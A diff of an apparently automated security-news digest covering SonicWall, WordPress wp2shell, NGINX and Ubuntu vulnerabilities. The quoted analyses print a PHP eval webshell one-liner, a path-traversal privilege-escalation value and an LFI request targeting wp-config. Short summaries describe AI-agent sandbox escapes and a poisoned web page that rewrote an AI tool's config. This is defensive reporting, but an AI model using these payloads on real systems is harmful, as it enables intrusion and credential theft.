&& hostname' Authenticated to [email protected] Peer flags: 0xd07df7fbd Peer creation: 1784069352 RPC os:cmd/1 => couchdb uid=1010(couchdb) gid=1(daemon) groups=1(daemon) /opt/couchdb SMAAppliance.sma With code execution established, the attacker can escalate to root on the appliance by exploiting CVE-2026-15410, which is a path traversal in the remove_hotfix workflow of ctrl-service. This can be performed via the web console or by hitting port 8188 on the device. The attacker provides a hotfix value containing a path traversal sequence to a malicious script, such as ../../../../var/tmp/privesc . The system executes the script as root and
 ```
 
-#### Corroborating sources (9)
+#### Corroborating sources (8)
 
 - **Rapid7** (offensive_vulnerability_research)
   - Title: Rapid7 MDR Team Discovers New SonicWall SMA1000 Zero Days being Actively Exploited (CVE-2026-15409, CVE-2026-15410)
@@ -936,11 +926,6 @@ Back to Blog Vulnerabilities and Exploits Rapid7 MDR Team Discovers New SonicWal
   - Published: 2026-07-20T13:32:26+00:00
   - Link: https://thehackernews.com/2026/07/weekly-recap-wordpress-rce-sonicwall-0.html
   - Summary: A single request should not be able to do this much. But this week, small inputs led to code execution, memory loss, stolen keys, and disabled security tools. The paths were often simple: exposed systems, weak checks, old drivers, fake prompts, and public code used for malware delivery. Some bugs were new. Others were already being used before defenders had time to patch. Here is the full
-- **CyberScoop** (cyber_news_breach_reporting)
-  - Title: SonicWall customers under threat as attackers exploit 2 zero-days
-  - Published: 2026-07-15T18:51:59+00:00
-  - Link: https://cyberscoop.com/sonicwall-zero-day-vulnerabilities-exploited/
-  - Summary: Researchers said the vulnerabilities, which attackers are chaining together, were first exploited three weeks before the vendor disclosed and patched the defects. The post SonicWall customers under threat as attackers exploit 2 zero-days appeared first on CyberScoop .
 - **Dark Reading** (cyber_news_breach_reporting)
   - Title: Inc Ransomware Exploits SonicWall SMA Zero-Days
   - Published: 2026-07-17T20:01:13+00:00
@@ -1015,15 +1000,15 @@ Back to Blog Vulnerabilities and Exploits CVE-2026-58644: Microsoft SharePoint S
   - Link: https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
   - Summary: From late April 2026 to mid-June 2026, Microsoft Defender Experts observed increased ACR Stealer activity across customer environments. These campaigns are successfully using ClickFix lures to steal browser credentials, authentication tokens, and sensitive documents from enterprise environments. The post ACR Stealer: Two observed intrusion chains amid increased threat activity appeared first on Microsoft Security Blog .
 
-### Cluster d0a6ea7ea5 — score 51
+### Cluster d0a6ea7ea5 — score 50
 
 - Title: Exploitation in the Wild of wp2shell
 - Source: Wiz Research (cloud_identity_infrastructure)
 - Published: 2026-07-20T18:00:08+00:00
 - Link: https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
 - Fetch status: ok
-- Member count: 11
-- Corroborating source count: 8
+- Member count: 12
+- Corroborating source count: 9
 - Strong signals: CVE-2026-60137, CVE-2026-63030, WordPress
 
 #### Cluster taxonomy (union across members)
@@ -1054,7 +1039,7 @@ Wiz Research has identified exploitation of "wp2shell", a critical pre-auth RCE 
 Wiz Pricing Get a demo Get a demo What are CVE-2026-63030 & CVE-2026-60137? These vulnerabilities comprise a critical pre-authentication remote code execution (RCE) chain in WordPress Core, dubbed "wp2shell", discovered by Searchlight Cyber using OpenAI GPT 5.6 Sol, and published on July 17th, 2026. This exploit chain allows unauthenticated attackers to gain remote code execution on default WordPress installations in any WordPress version released since December 2025. What’s the risk to cloud environments? Our data indicates that 60% of organizations using WordPress initially had at least one vulnerable instance at the time these CVEs were published, and 25% were exposing a vulnerable server to the Internet. However, this figure is rapidly declining as organizations patch, lowering to 50% and 10% respectively within 24 hours of the initial publication. What evidence of exploitation has Wiz Research identified? Almost immediately following the vulnerability chain’s publication, many exploit POCs were made available by security researchers, most of which were limited to SQL injection on default WordPress configurations while allowing RCE under specific conditions. However, later POCs achieved RCE against arbitrary targets. So far we’ve observed multiple actors successfully exploiting this vulnerability chain against WordPress instances self-hosted in the cloud. Following successful batch API exploitation, we’ve observed the following post-exploitation activities: Malicious plugin upload - Attackers accessed /wp-admin/plugin-install.php?tab=upload and successfully executed POST /wp-admin/update.php?action=upload-plugin , to install persistent backdoors. User enumeration - Attackers sent requests to /wp-json/wp/v2/users?context=edit to harvest admin usernames and email addresses. Local file inclusion attempts - Attackers performed LFI attacks via admin-ajax.php?template=../../../wp-config , targeting database credentials and authentication keys for exfiltration. Admin panel access - Attackers accessed /wp-admin/ and received HTTP 200 responses indicating successful authenticated sessions. We’ve also observed high-volume scanning activity without subsequent post-exploitation, suggesting opportunistic mass-scanning campaigns seeking to identify vulnerable targets alongside legitimate security scanning activity. We have yet to identify lateral movement or data exfiltration, but we continue to monitor and investigate. In terms of deployed malware, among our findings were two PHP webshells that represent opposite ends of the sophistication spectrum. The first was a minimal one-liner: <?php eval($_POST['[REDACTED]']??'http_response_code(404);'); This is a bare-bones backdoor that provides remote code execution to anyone that knows the parameter name, and returns 404 as an evasion technique. We regularly see these types of webshells deployed following most new RCE vulnerabilities; they are one of the most common types of findings when investigating mass exploitation of an emerging vulnerability. The second was a massive 150KB webshell disguised as a WordPress plugin called "CMSmap". The original legitimate plugin is a simple security tool, but this sample included a full-featured attack platform with a graphical interface, password authentication, and a broad set of capabilities including file management, database access, port scanning, batch code injection, and multiple privilege escalation modules including MySQL UDF exploitation. The payload is obfuscated through hex-encoded string concatenation and gzip-compressed base64 encoding, unpacked at runtime via eval(gzuncompress(base64_decode(...))) . The internal payload very closely matches a known PHP webshell with modified variables such as shellname and password. A third malicious WordPress plugin we observed was also a PHP webshell. By registering a custom REST API endpoint ( /morning/v1/[REDACTED] ) with a permissive callback ( __return_true ), it allows attackers to send POST reques
 ```
 
-#### Corroborating sources (8)
+#### Corroborating sources (9)
 
 - **Wiz Research** (cloud_identity_infrastructure)
   - Title: Exploitation in the Wild of wp2shell
@@ -1086,6 +1071,11 @@ Wiz Pricing Get a demo Get a demo What are CVE-2026-63030 & CVE-2026-60137? Thes
   - Published: 2026-07-18T21:17:40+00:00
   - Link: https://www.reddit.com/r/netsec/comments/1v07npi/wp2shell_cve202663030_preauth_rce_chain_in/
   - Summary: submitted by /u/mazen160 [link] [comments]
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: Critical wp2shell WordPress flaws exploited to install webshells
+  - Published: 2026-07-21T16:41:50+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/critical-wp2shell-wordpress-flaws-exploited-to-install-webshells/
+  - Summary: Hackers are exploiting the "wp2shell" critical vulnerability suite (CVE-2026-63030 and CVE-2026-60137) affecting WordPress Core to deploy persistent webshells and install malicious plugins on affected servers. [...]
 - **Dark Reading** (cyber_news_breach_reporting)
   - Title: 'WP2Shell' Opens Millions of WordPress Sites to Remote Takeover
   - Published: 2026-07-20T21:38:18+00:00
@@ -1157,7 +1147,7 @@ Threat Research Center High Profile Threats Malware Malware The npm Threat Lands
   - Link: https://thehackernews.com/2026/07/seven-malicious-vite-npm-packages-use.html
   - Summary: Cybersecurity researchers have discovered a cluster of seven malicious npm packages targeting the Vite frontend tooling ecosystem as part of a software supply chain attack. The malicious package campaign, codenamed ViteVenom by Checkmarx, marks an expansion of ChainVeil, which was observed using an "unprecedented" four-tier blockchain-based command-and-control (C2) infrastructure spanning Tron,
 
-### Cluster 9e0819b3d1 — score 22
+### Cluster 9e0819b3d1 — score 21
 
 - Title: Critical Heap Buffer Overflow in NGINX Allows Unauthenticated Remote Code Execution
 - Source: Orca Security Research (cloud_identity_infrastructure)
@@ -1193,7 +1183,7 @@ A critical vulnerability (CVE-2026-42533, CVSS v4.0 9.2 / CVSS v3.1 8.1) was dis
 #### Full body
 
 ```
-A critical vulnerability ( CVE-2026-42533 , CVSS v4.0 9.2 / CVSS v3.1 8.1) was disclosed affecting NGINX Open Source and NGINX Plus, allowing attackers to trigger a heap buffer overflow and potentially achieve remote code execution via crafted HTTP requests targeting the map directive regex handling. Due to the potential for service disruption and code execution across one of the most widely deployed web servers in the world, immediate patching is required. About CVE-2026-42533 The issue originates from the NGINX map directive’s regex matching logic, where a heap buffer overflow (CWE-122) occurs when a string expression references unnamed capture variables before the map output variable. By sending specially crafted HTTP requests to an NGINX server using map directives with regex matching, attackers can overflow a heap buffer in the worker process, causing worker restarts (denial of service) and potentially gaining code execution on systems where ASLR is disabled or bypassed. No authentication is required to exploit this issue. F5 also patched two additional high-severity NGINX vulnerabilities in the same advisory. CVE-2026-60005 (CVSS v4.0 8.8) is an uninitialized memory disclosure in the ngx_http_slice_module that can leak sensitive data from worker process memory. CVE-2026-56434 (CVSS v4.0 8.3) is a use-after-free condition in the ngx_http_ssi_module when used with proxy_pass and proxy_buffering disabled. A separate BIG-IP HTTP/2 memory exhaustion vulnerability was also addressed. Users should upgrade NGINX Open Source to 1.31.3 (mainline) or 1.30.4 (stable), and NGINX Plus to 37.0.3.1 or R36 P7. For CVE-2026-42533 and CVE-2026-60005, switching to named regex captures in map directives serves as a temporary mitigation. CVE-2026-56434 has no workaround, so patching is the only option. NGINX Ingress Controller, Gateway Fabric, App Protect WAF, and Instance Manager should all be updated to their respective patched versions. Affected Systems The following components are affected: NGINX Open Source versions 0.9.6 through 1.31.2 (nearly all deployed versions) NGINX Plus versions prior to 37.0.3.1 and R36 P7 NGINX Ingress Controller versions 3.5.0 through 3.7.2, 4.0.0 through 4.0.1, and 5.0.0 through 5.4.2 NGINX Gateway Fabric (various 1.x and 2.x versions) NGINX App Protect WAF versions 4.9.0 through 4.16.0 and 5.1.0 through 5.8.0 NGINX Instance Manager versions 2.16.0 through 2.22.0 These components are used extensively in cloud infrastructure, Kubernetes clusters, and internet-facing deployments worldwide, making the blast radius of this vulnerability particularly large. Organizations running NGINX as a reverse proxy, load balancer, or ingress controller in containerized environments are especially exposed. Risk Impact At the time of writing, no proof-of-concept exploit has been publicly released, and no exploitation in the wild has been reported. Regardless, the severity and ease of exploitation make this vulnerability high risk, especially in internet-facing deployments. Successful exploitation could allow attackers to crash NGINX worker processes causing denial of service, execute arbitrary code on systems without ASLR protections, and potentially pivot to further compromise backend infrastructure, leading to service disruption, data exposure, or full infrastructure compromise. How Orca Can Help Orca enables customers to quickly identify assets running vulnerable NGINX versions, understand their exposure in context — including internet accessibility, runtime reachability , and asset criticality — and prioritize remediation based on real risk rather than CVSS alone. Orca’s agentless scanning detects vulnerable NGINX installations across cloud environments, including containerized deployments in Kubernetes . The platform highlights affected assets directly in the alert view, helping security teams focus on the most critical remediation paths first. Related articles Product Info It Was Not a Warning Shot. It Was the First of Ma
+A critical vulnerability ( CVE-2026-42533 , CVSS v4.0 9.2 / CVSS v3.1 8.1) was disclosed affecting NGINX Open Source and NGINX Plus, allowing attackers to trigger a heap buffer overflow and potentially achieve remote code execution via crafted HTTP requests targeting the map directive regex handling. Due to the potential for service disruption and code execution across one of the most widely deployed web servers in the world, immediate patching is required. About CVE-2026-42533 The issue originates from the NGINX map directive’s regex matching logic, where a heap buffer overflow (CWE-122) occurs when a string expression references unnamed capture variables before the map output variable. By sending specially crafted HTTP requests to an NGINX server using map directives with regex matching, attackers can overflow a heap buffer in the worker process, causing worker restarts (denial of service) and potentially gaining code execution on systems where ASLR is disabled or bypassed. No authentication is required to exploit this issue. F5 also patched two additional high-severity NGINX vulnerabilities in the same advisory. CVE-2026-60005 (CVSS v4.0 8.8) is an uninitialized memory disclosure in the ngx_http_slice_module that can leak sensitive data from worker process memory. CVE-2026-56434 (CVSS v4.0 8.3) is a use-after-free condition in the ngx_http_ssi_module when used with proxy_pass and proxy_buffering disabled. A separate BIG-IP HTTP/2 memory exhaustion vulnerability was also addressed. Users should upgrade NGINX Open Source to 1.31.3 (mainline) or 1.30.4 (stable), and NGINX Plus to 37.0.3.1 or R36 P7. For CVE-2026-42533 and CVE-2026-60005, switching to named regex captures in map directives serves as a temporary mitigation. CVE-2026-56434 has no workaround, so patching is the only option. NGINX Ingress Controller, Gateway Fabric, App Protect WAF, and Instance Manager should all be updated to their respective patched versions. Affected Systems The following components are affected: NGINX Open Source versions 0.9.6 through 1.31.2 (nearly all deployed versions) NGINX Plus versions prior to 37.0.3.1 and R36 P7 NGINX Ingress Controller versions 3.5.0 through 3.7.2, 4.0.0 through 4.0.1, and 5.0.0 through 5.4.2 NGINX Gateway Fabric (various 1.x and 2.x versions) NGINX App Protect WAF versions 4.9.0 through 4.16.0 and 5.1.0 through 5.8.0 NGINX Instance Manager versions 2.16.0 through 2.22.0 These components are used extensively in cloud infrastructure, Kubernetes clusters, and internet-facing deployments worldwide, making the blast radius of this vulnerability particularly large. Organizations running NGINX as a reverse proxy, load balancer, or ingress controller in containerized environments are especially exposed. Risk Impact At the time of writing, no proof-of-concept exploit has been publicly released, and no exploitation in the wild has been reported. Regardless, the severity and ease of exploitation make this vulnerability high risk, especially in internet-facing deployments. Successful exploitation could allow attackers to crash NGINX worker processes causing denial of service, execute arbitrary code on systems without ASLR protections, and potentially pivot to further compromise backend infrastructure, leading to service disruption, data exposure, or full infrastructure compromise. How Orca Can Help Orca enables customers to quickly identify assets running vulnerable NGINX versions, understand their exposure in context — including internet accessibility, runtime reachability , and asset criticality — and prioritize remediation based on real risk rather than CVSS alone. Orca’s agentless scanning detects vulnerable NGINX installations across cloud environments, including containerized deployments in Kubernetes . The platform highlights affected assets directly in the alert view, helping security teams focus on the most critical remediation paths first. Related articles Security for the Way You Work: Orca Integrates with Claude’s C
 ```
 
 #### Corroborating sources (2)
@@ -1209,7 +1199,7 @@ A critical vulnerability ( CVE-2026-42533 , CVSS v4.0 9.2 / CVSS v3.1 8.1) was d
   - Link: https://thehackernews.com/2026/07/critical-nginx-vulnerability-can-crash.html
   - Summary: F5 has shipped fixes for a critical nginx flaw that lets a remote, unauthenticated attacker trigger a heap buffer overflow in the worker process with crafted HTTP requests. CVE-2026-42533 was patched on July 15 in nginx 1.30.4 (stable) and 1.31.3 (mainline), and in NGINX Plus 37.0.3.1; anyone on an earlier build should upgrade. Triggering it can crash or restart the worker, causing a denial of
 
-### Cluster 06406030dc — score 21
+### Cluster 06406030dc — score 20
 
 - Title: Critical Ubuntu Pro Client Vulnerability Enables Root Code Execution Across Cloud Workloads
 - Source: Orca Security Research (cloud_identity_infrastructure)
@@ -1243,7 +1233,7 @@ A critical vulnerability (CVE-2026-11386, CVSS 9.0) was disclosed affecting Cano
 #### Full body
 
 ```
-Table of contents About CVE-2026-11386 Affected Systems Risk Impact How Orca Can Help A critical vulnerability ( CVE-2026-11386 , CVSS 9.0) was disclosed affecting Canonical’s Ubuntu Pro Client (ubuntu-advantage-tools), allowing attackers to execute arbitrary code with root privileges via a spoofed or tampered contract server response. Due to the potential for full system compromise across cloud environments, immediate patching is required. About CVE-2026-11386 The issue originates from the Ubuntu Pro Client’s handling of contract server responses, where the directives.suites[] and directives.aptURL fields are written into APT source files using Python’s str.format() with no escaping and no newline filtering. This allows embedded newlines to inject malicious APT directives. Additionally, the unvalidated additionalPackages[] field passes directly into a root-executed apt-get install command. By sending a spoofed or tampered contract server response, attackers can inject arbitrary APT sources and trigger package installations as root, potentially achieving full system takeover. The attack requires network-level access with high complexity, such as compromised internal infrastructure or intercepted connections using trusted certificates. Affected Systems The following components are affected: ubuntu-advantage-tools and ubuntu-pro-client across all Ubuntu LTS releases from 14.04 through 26.04. The vulnerable versions include all releases prior to the patched versions listed below. The Ubuntu Pro Client is preinstalled on Ubuntu Server and auto-attaches on cloud Ubuntu Pro images, making the exposure particularly broad across cloud workloads . Ubuntu 25.10 (end-of-life) received no patch. The advisory USN-8555-1 also addresses two companion vulnerabilities: CVE-2026-9494 (Pro bearer token exposure in command-line arguments) and CVE-2026-12391 (symlink handling flaw in log collection). Users should upgrade ubuntu-advantage-tools to the following patched versions via standard system update (apt update && apt upgrade): – Ubuntu 26.04 LTS: 37.2ubuntu0.1 – Ubuntu 24.04 LTS: 37.2ubuntu~24.04.1 – Ubuntu 22.04 LTS: 37.2ubuntu~22.04.1 – Ubuntu 20.04 LTS: 37.1ubuntu0~20.04.1 – Ubuntu 18.04 LTS: 37.1ubuntu0~18.04.1 – Ubuntu 16.04 LTS: 37.1ubuntu0~16.04.1 – Ubuntu 14.04 LTS: 19.7ubuntu0.1 No workaround exists for unpatched systems. Patches for Ubuntu 16.04, 18.04, and 14.04 require Ubuntu Pro with Legacy Support. Risk Impact At the time of writing, no public proof-of-concept exists, and no exploitation in the wild has been reported. Regardless, the severity and ease of exploitation once the prerequisite network position is achieved make this vulnerability high risk , especially in internet-facing cloud deployments where the Ubuntu Pro Client auto-attaches. Successful exploitation could allow attackers to execute arbitrary code as root, install malicious packages and persist access, and potentially pivot across the environment , leading to service disruption, data exposure, or full infrastructure compromise. The scope change in the CVSS vector (S:C) indicates that compromise extends beyond the vulnerable component itself. How Orca Can Help Orca enables customers to quickly identify assets running vulnerable versions of ubuntu-advantage-tools, understand their exposure in context — including internet accessibility, runtime reachability, and asset criticality — and prioritize remediation based on real risk rather than CVSS alone. Orca’s platform highlights affected assets directly in the alert view, helping security teams focus on the most critical remediation paths first. Table of contents About CVE-2026-11386 Affected Systems Risk Impact How Orca Can Help Related articles Product Info It Was Not a Warning Shot. It Was the First of Many. Jul 20, 2026 Research Critical Heap Buffer Overflow in NGINX Allows Unauthenticated Remote Code Execution Jul 20, 2026 Cloud Security Learning Cloud Risk Dashboards for Executives: A Practical Guide to KPIs, Exa
+Table of contents About CVE-2026-11386 Affected Systems Risk Impact How Orca Can Help A critical vulnerability ( CVE-2026-11386 , CVSS 9.0) was disclosed affecting Canonical’s Ubuntu Pro Client (ubuntu-advantage-tools), allowing attackers to execute arbitrary code with root privileges via a spoofed or tampered contract server response. Due to the potential for full system compromise across cloud environments, immediate patching is required. About CVE-2026-11386 The issue originates from the Ubuntu Pro Client’s handling of contract server responses, where the directives.suites[] and directives.aptURL fields are written into APT source files using Python’s str.format() with no escaping and no newline filtering. This allows embedded newlines to inject malicious APT directives. Additionally, the unvalidated additionalPackages[] field passes directly into a root-executed apt-get install command. By sending a spoofed or tampered contract server response, attackers can inject arbitrary APT sources and trigger package installations as root, potentially achieving full system takeover. The attack requires network-level access with high complexity, such as compromised internal infrastructure or intercepted connections using trusted certificates. Affected Systems The following components are affected: ubuntu-advantage-tools and ubuntu-pro-client across all Ubuntu LTS releases from 14.04 through 26.04. The vulnerable versions include all releases prior to the patched versions listed below. The Ubuntu Pro Client is preinstalled on Ubuntu Server and auto-attaches on cloud Ubuntu Pro images, making the exposure particularly broad across cloud workloads . Ubuntu 25.10 (end-of-life) received no patch. The advisory USN-8555-1 also addresses two companion vulnerabilities: CVE-2026-9494 (Pro bearer token exposure in command-line arguments) and CVE-2026-12391 (symlink handling flaw in log collection). Users should upgrade ubuntu-advantage-tools to the following patched versions via standard system update (apt update && apt upgrade): – Ubuntu 26.04 LTS: 37.2ubuntu0.1 – Ubuntu 24.04 LTS: 37.2ubuntu~24.04.1 – Ubuntu 22.04 LTS: 37.2ubuntu~22.04.1 – Ubuntu 20.04 LTS: 37.1ubuntu0~20.04.1 – Ubuntu 18.04 LTS: 37.1ubuntu0~18.04.1 – Ubuntu 16.04 LTS: 37.1ubuntu0~16.04.1 – Ubuntu 14.04 LTS: 19.7ubuntu0.1 No workaround exists for unpatched systems. Patches for Ubuntu 16.04, 18.04, and 14.04 require Ubuntu Pro with Legacy Support. Risk Impact At the time of writing, no public proof-of-concept exists, and no exploitation in the wild has been reported. Regardless, the severity and ease of exploitation once the prerequisite network position is achieved make this vulnerability high risk , especially in internet-facing cloud deployments where the Ubuntu Pro Client auto-attaches. Successful exploitation could allow attackers to execute arbitrary code as root, install malicious packages and persist access, and potentially pivot across the environment , leading to service disruption, data exposure, or full infrastructure compromise. The scope change in the CVSS vector (S:C) indicates that compromise extends beyond the vulnerable component itself. How Orca Can Help Orca enables customers to quickly identify assets running vulnerable versions of ubuntu-advantage-tools, understand their exposure in context — including internet accessibility, runtime reachability, and asset criticality — and prioritize remediation based on real risk rather than CVSS alone. Orca’s platform highlights affected assets directly in the alert view, helping security teams focus on the most critical remediation paths first. Table of contents About CVE-2026-11386 Affected Systems Risk Impact How Orca Can Help Related articles Security for the Way You Work: Orca Integrates with Claude’s Compliance API Jul 21, 2026 Product Info It Was Not a Warning Shot. It Was the First of Many. Jul 20, 2026 Research Critical Heap Buffer Overflow in NGINX Allows Unauthenticated Remote Code Execution Jul 20, 2026 Sta
 ```
 
 #### Corroborating sources (1)
@@ -1261,7 +1251,7 @@ Table of contents About CVE-2026-11386 Affected Systems Risk Impact How Orca Can
 - Published: 2026-07-21T15:00:00+00:00
 - Link: https://cloud.google.com/blog/products/identity-security/find-and-fix-software-vulnerabilities-with-codemender/
 - Fetch status: ok
-- Member count: 5
+- Member count: 6
 - Corroborating source count: 4
 - Strong signals: Google/Gemini
 
@@ -1270,7 +1260,7 @@ Table of contents About CVE-2026-11386 Affected Systems Risk Impact How Orca Can
 - affected_industries: government, healthcare
 - affected_products: Google Cloud, Google/Gemini, Salesforce
 - urgency_signals: zero_day
-- content_type: news_report
+- content_type: news_report, vendor_announcement
 - confidence_tier: tier_2_operator, tier_4_news
 
 #### Primary article taxonomy
@@ -1306,10 +1296,10 @@ Security & Identity Now in preview: Find and fix software vulnerabilities with C
   - Link: https://www.bleepingcomputer.com/news/security/cursor-codex-gemini-cli-antigravity-hit-by-sandbox-escapes/
   - Summary: Researchers escaped the sandboxes in Cursor, Codex, Gemini CLI and Antigravity by having the AI agent write files that trusted host tools later run. Multiple CVEs, patches, and Google downgrading two Antigravity findings. [...]
 - **The Hacker News** (cyber_news_breach_reporting)
-  - Title: Russian-Speaking Hacker Uses Google Gemini CLI to Control Botnet of Eight Dental Clinic PCs
-  - Published: 2026-07-20T09:07:11+00:00
-  - Link: https://thehackernews.com/2026/07/russian-speaking-hacker-uses-google.html
-  - Summary: A solo Russian-speaking threat actor known as "bandcampro" outsourced a chunk of their operations to Google's open-source Gemini CLI artificial intelligence (AI) and commandeered a live botnet. The findings come from an analysis of 200 Gemini CLI session logs between March 19 and April 21, 2026, which found the threat actor using AI, among other things, to crack passwords, set up a residential
+  - Title: Google Launches Gemini 3.5 Flash Cyber AI to Find and Fix Software Vulnerabilities
+  - Published: 2026-07-21T15:09:28+00:00
+  - Link: https://thehackernews.com/2026/07/google-launches-gemini-35-flash-cyber.html
+  - Summary: Google's DeepMind on Tuesday announced the release of Gemini 3.5 Flash Cyber, a specialized artificial intelligence (AI) model built atop 3.5 Flash that's designed to discover, validate, and patch vulnerabilities quickly and efficiently. According to the tech giant, the model will be exclusively available to governments and trusted partners via CodeMender as part of a limited-access pilot
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - Title: Introducing Gemini 3.5 Flash Cyber
   - Published: 2026-07-17T15:00:11+00:00
@@ -1494,6 +1484,45 @@ Table of Contents Initial sign of an attack First case: abusing RDP to encrypt d
   - Link: https://securelist.com/new-extortion-scheme-printers-bitlocker/120718/
   - Summary: We cover two recent cases of BitLocker extortion using RDP, MSSQL, RMM tools, web shells, and printers. The story includes TTPs and recommendations.
 
+### Cluster 0e52963d05 — score 16
+
+- Title: Why Exposure Management Is Replacing Vulnerability Management
+- Source: Horizon3 Attack Research (offensive_vulnerability_research)
+- Published: 2026-07-21T17:47:25+00:00
+- Link: https://horizon3.ai/intelligence/blogs/exposure-vs-vulnerability-management/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+Traditional vulnerability management tells you what is broken. Exposure management reveals what attackers can actually exploit. Learn why security leaders are shifting from vulnerability counts to measurable exposure reduction.
+```
+
+#### Full body
+
+```
+Why Exposure Management Is Replacing Vulnerability Management Stephen Gates July 21, 2026 Blogs Visibility Isn’t the Problem Vulnerability management isn’t failing because security teams lack visibility. Most organizations already have more findings than they can reasonably address. Yet despite all those findings, many CISOs still struggle to answer a deceptively simple question: Are we actually becoming harder to attack? That question sits at the center of a growing problem. Security programs have become very good at finding issues, but finding issues and reducing risk are not the same thing. In many organizations, those two concepts have become interchangeable, which is exactly why traditional vulnerability management is beginning to break down. The underlying assumption behind vulnerability management is straightforward. If you can identify vulnerabilities, prioritize them, and patch them, risk should decrease. That logic worked reasonably well when environments were smaller, infrastructure changed at a slower pace, and vulnerabilities were treated as the primary indicator of risk. Today’s environments operate differently. Vulnerabilities are rarely encountered in isolation and are often only one component of a broader security problem. The challenge is no longer finding vulnerabilities. The challenge is understanding exposure. This shift is one reason the Gartner® Continuous Threat Exposure Management (CTEM) framework has gained traction. At its core, the framework recognizes that understanding risk requires looking beyond individual vulnerabilities and evaluating the broader exposures that attackers can actually exploit. Why Prioritization Keeps Falling Short The challenge becomes apparent when organizations try to prioritize risk. Traditional vulnerability management evaluates findings individually, often using severity scores as a proxy for risk. Attackers take a different approach. They evaluate how weaknesses connect, what access they provide, and how they can be combined to reach a meaningful objective. That distinction matters because severity and risk are not the same thing. A critical vulnerability that cannot be reached or exploited may represent very little practical risk. Meanwhile, a lower-severity issue combined with weak credentials, excessive permissions, or a misconfigured identity relationship can create a direct path to sensitive systems and data. Attackers understand this instinctively. They do not attack vulnerabilities one at a time. They chain weaknesses together, move laterally across environments, escalate privileges, and pursue the path that gets them closest to their objective. Severity Is Not Risk One of the biggest reasons vulnerability management struggles today is that severity has become a stand-in for risk. It is easy to understand why. Severity scores provide a standardized way to compare findings, helping teams sort large volumes of vulnerabilities and establish remediation priorities. A vulnerability only matters if it contributes to an attacker’s ability to achieve an objective, whether that objective is accessing sensitive data, escalating privileges, or moving laterally through an environment. In every case, the question is not, “How severe is this vulnerability?” but rather, “Can this weakness be used as part of a path to something valuable?” Those are fundamentally different questions. One measures the characteristics of a finding. The other evaluates the opportunity it creates for an attacker. As environments become more interconnected, the gap between those perspectives continues to grow. Exposure Is Bigger Than Vulnerabilities Visibility tells you what vulnerabilities exist. Exposure tells you how attackers can use them. That distinction is becoming increasingly important because exposure is broader than a vulnerability. It includes the relationships between weaknesses, identities, permissions, assets, trust relationships, and business systems that create opportunities for attack
+```
+
+#### Corroborating sources (1)
+
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - Title: Why Exposure Management Is Replacing Vulnerability Management
+  - Published: 2026-07-21T17:47:25+00:00
+  - Link: https://horizon3.ai/intelligence/blogs/exposure-vs-vulnerability-management/
+  - Summary: Traditional vulnerability management tells you what is broken. Exposure management reveals what attackers can actually exploit. Learn why security leaders are shifting from vulnerability counts to measurable exposure reduction.
+
 ### Cluster dedbaa9f38 — score 16
 
 - Title: From a Single Alert to 1,000 Files: Inside an Exposed WebDAV Malware Delivery Lab
@@ -1596,7 +1625,7 @@ Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Acce
 - Published: 2026-07-15T13:00:00+00:00
 - Link: https://www.rapid7.com/blog/post/dr-investigating-aws-persistence-mechanisms
 - Fetch status: ok
-- Member count: 4
+- Member count: 6
 - Corroborating source count: 3
 - Strong signals: AWS
 
@@ -1630,15 +1659,15 @@ Back to Blog Detection and Response Investigating Persistence Mechanisms in AWS 
   - Link: https://www.rapid7.com/blog/post/dr-investigating-aws-persistence-mechanisms
   - Summary: Overview In the cloud, your infrastructure may be short-lived, but an attacker’s persistence doesn't have to be. While your environment scales and changes in seconds, adversaries are embedding themselves into your IAM policies, Lambda functions, and federated sessions, creating invisible footholds that survive long after you believe an incident is closed. Persistence in AWS is not just a technical oversight; it is a fundamental business risk. If you cannot see how an attacker has rooted themselves in your environment, you cannot contain them. This article moves beyond theory to provide the critical detection logic, investigation workflows, and actionable response steps required to hunt down hidden persistence and reclaim your AWS environment. This reference enables Rapid7 Incident Command customers to investigate and understand AWS alert behaviors. Persistence technique: IAM user One of the most common persistence techniques is maintaining access by creating or modifying Identity and A
 - **AWS Security Blog** (cloud_identity_infrastructure)
-  - Title: Introducing the Amazon GuardDuty investigation agent: on-demand AI-powered threat assessment
-  - Published: 2026-07-20T21:59:00+00:00
-  - Link: https://aws.amazon.com/blogs/security/introducing-the-amazon-guardduty-investigation-agent-on-demand-ai-powered-threat-assessment/
-  - Summary: The new Amazon GuardDuty investigation agent (now in public preview) investigates security findings across your Amazon Web Services (AWS) environment, reducing investigation time from hours to minutes. GuardDuty is our managed threat detection service that continuously monitors your AWS accounts and workloads for suspicious, potentially malicious activity, and unauthorized behavior, delivering detailed security findings for […]
+  - Title: Do more with AWS WAF labels using dynamic label interpolation
+  - Published: 2026-07-21T17:03:16+00:00
+  - Link: https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/
+  - Summary: AWS WAF classifies web traffic by attaching metadata to each request it evaluates. Managed rule groups such as AWS WAF Bot Control and AWS WAF Fraud Control account takeover prevention (ATP) attach labels that describe what they found. A label can record that a request came from a known bot category or that it matched […]
 - **The Hacker News** (cyber_news_breach_reporting)
-  - Title: New NadMesh Botnet Hunts Exposed AI Services for Cloud Keys and Kubernetes Tokens
-  - Published: 2026-07-17T17:12:23+00:00
-  - Link: https://thehackernews.com/2026/07/new-nadmesh-botnet-hunts-exposed-ai.html
-  - Summary: A Go botnet called NadMesh turned up in early July hunting exposed AI services, and the operator's own dashboard claims 3,811 unique AWS keys. A Shodan harvester keeps the scan queue stocked with ComfyUI, Ollama, n8n, Open WebUI, Langflow, and Gradio: the image generators, local model runners, and workflow builders that teams stand up fast and firewall late. The intel feed behind that counter
+  - Title: AWS Kiro Flaw Let a Poisoned Web Page Rewrite Its Config and Run Code
+  - Published: 2026-07-21T16:06:12+00:00
+  - Link: https://thehackernews.com/2026/07/aws-kiro-flaw-let-poisoned-web-page.html
